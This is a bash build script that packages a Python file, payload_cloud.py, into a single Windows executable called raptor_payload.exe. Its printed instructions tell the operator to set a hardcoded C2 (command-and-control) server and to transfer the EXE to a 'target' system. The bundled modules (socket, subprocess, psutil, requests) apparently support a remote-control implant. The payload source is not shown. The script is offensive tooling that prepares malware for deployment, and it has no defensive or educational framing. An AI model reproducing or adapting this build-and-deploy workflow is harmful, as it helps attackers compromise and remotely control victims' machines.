#!/bin/bash

# Build script for converting payload_cloud.py to standalone EXE
# This creates a Windows executable that includes all dependencies

echo "🔨 Building RAPTOR Payload EXE..."
echo "=================================="

# Check if PyInstaller is installed
if ! python3 -c "import PyInstaller" 2>/dev/null; then
    echo "❌ PyInstaller not found. Installing..."
    pip3 install pyinstaller
fi

echo ""
echo "📦 Packaging payload_cloud.py..."
echo ""

# Build the EXE with PyInstaller from the root directory
# Options:
#   --onefile: Bundle everything into a single executable
#   --name: Output filename
#   --clean: Clean PyInstaller cache before building
#   --distpath: Output directory for the EXE
#   --workpath: Temporary build directory
#   --specpath: Where to save the .spec file
#   --hidden-import: Explicitly include these modules (in case PyInstaller misses them)
#   --collect-all: Collect all submodules and data files for these packages

pyinstaller \
    --onefile \
    --name raptor_payload \
    --clean \
    --distpath ./dist \
    --workpath ./build/temp \
    --specpath ./build \
    --hidden-import=psutil \
    --hidden-import=socket \
    --hidden-import=platform \
    --hidden-import=subprocess \
    --hidden-import=json \
    --hidden-import=requests \
    --hidden-import=urllib3 \
    --hidden-import=certifi \
    --hidden-import=charset_normalizer \
    --hidden-import=idna \
    --collect-all psutil \
    payload_cloud.py

# Check if build was successful
if [ $? -eq 0 ]; then
    echo ""
    echo "✅ Build successful!"
    echo ""
    echo "📍 EXE Location: dist/raptor_payload.exe"
    echo "📏 File size: $(du -h ./dist/raptor_payload.exe 2>/dev/null | cut -f1 || echo 'N/A')"
    echo ""
    echo "⚠️  IMPORTANT: Update C2_SERVER in payload_cloud.py before building!"
    echo "   Currently set to: $(grep 'C2_SERVER = ' payload_cloud.py | grep -v '#' | head -1 | cut -d'"' -f2)"
    echo ""
    echo "🚀 Usage:"
    echo "   Windows: raptor_payload.exe"
    echo "   Linux:   wine raptor_payload.exe"
    echo ""
    echo "💡 Tips:"
    echo "   - No command-line arguments needed (C2 server is hardcoded)"
    echo "   - Transfer the EXE to your target Windows system"
    echo "   - No Python installation needed on target"
    echo "   - All dependencies are bundled inside"
    echo ""
else
    echo ""
    echo "❌ Build failed!"
    echo "Check the error messages above for details."
    exit 1
fi
